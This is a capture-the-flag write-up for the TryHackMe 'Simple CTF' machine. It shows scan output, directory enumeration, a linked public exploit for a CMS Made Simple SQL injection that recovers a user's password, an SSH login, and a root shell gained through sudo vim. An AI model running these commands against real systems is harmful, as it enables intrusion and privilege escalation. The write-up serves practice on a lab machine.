---
title: Simple CTF
description: Writeup for the TryHackMe machine Simple CTF
date: 2019-08-19
categories: [TryHackMe]
tags: [try-hack-me,thm]
---

## Recon

### nmap

`nmap` finds three open ports: FTP (21), HTTP (80) and SHH (2222).
```
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.1.173
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
```

### HTTP - TCP 80

The root page displays the default Apache welcome page.

I use `gobuster` to enumerate directories:
```console
$ gobuster dir -u "http://simple-ctf.thm/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 404 -t 200 --timeout 40s -k
/simple               (Status: 301) [Size: 317] [--> http://simple-ctf.thm/simple/]
```
The `/simple/` directory hosts an instance of CMS Made Simple 2.2.8. A quick search for known vulnerabilities leads to CVE-2019-9053, a time-based SQL injection vulnerability.

## Shell as mitch

I exploit the SQL injection using [this](https://www.exploit-db.com/exploits/46635) script:
```console
$ python2 46635.py -u "http://cyborg.thm/simple/" -w /usr/share/wordlists/rockyou.txt --crack
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: <REDACTED>
```
Using the credentials, I successfully connect via SSH as `mitch`.

## Shell as root

I check `sudo` privileges:
```console
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
I escalate my privileges using [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo):
```console
sudo /usr/bin/vim -c ':!/bin/sh'
```
